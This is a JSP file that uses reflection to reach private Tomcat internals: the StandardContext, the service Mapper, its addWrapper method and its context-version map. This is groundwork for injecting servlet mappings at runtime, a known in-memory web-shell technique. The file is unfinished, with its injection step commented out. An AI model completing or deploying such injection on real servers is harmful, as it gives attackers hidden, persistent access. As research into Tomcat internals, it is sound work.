<%--
  Created by IntelliJ IDEA.
  User: liufei
  Date: 2020/11/24
  Time: 11:32
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.*" %>
<%@ page import="org.apache.coyote.*" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoader" %>
<%@ page import="org.apache.catalina.webresources.StandardRoot" %>
<%@ page import="java.lang.reflect.*" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardService" %>
<%@ page import="org.apache.catalina.mapper.Mapper" %>
<%@ page import="org.apache.catalina.loader.WebappClassLoaderBase" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap " %>

<%!
  public static Object clone(Object object) throws  IllegalAccessException, InstantiationException {
      Object cloneObject = null;
      if( object != null){
          cloneObject = object.getClass().newInstance();
      }
      Field[] fields = object.getClass().getDeclaredFields();
      for(Field f:fields){
          if (java.lang.reflect.Modifier.isFinal(f.getModifiers())) {
              continue;
          }
          f.setAccessible(true);
          f.set(cloneObject, f.get(object));

      }
      return cloneObject;
  }
%>
<%

    StandardContext context = (StandardContext)((StandardRoot)((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources()).getContext();
    Field appcontextF = context.getClass().getDeclaredField("context");
    appcontextF.setAccessible(true);
    ApplicationContext appcontext = (ApplicationContext) appcontextF.get(context);

    Field serviceF = appcontext.getClass().getDeclaredField("service");
    serviceF.setAccessible(true);
    StandardService service = (StandardService) serviceF.get(appcontext);

    Mapper mapper = service.getMapper();
    out.println(mapper);

    Class[] classes = mapper.getClass().getDeclaredClasses();
    Class contextversion = classes[1];
    Method addWrapper = mapper.getClass().getDeclaredMethod("addWrapper", contextversion, String.class, Wrapper.class, boolean.class, boolean.class);

    Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
    contextObjectToContextVersionMapF.setAccessible(true);
    ConcurrentHashMap  contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);

    Object contextVersion = contextObjectToContextVersionMap.get(context);

    out.println(clone(contextVersion));
    // Wrapper newWrapper = clone(contextVersion.exactWrappers[0]));


    // Object Wrapper  
    

    out.println("ok");

%>
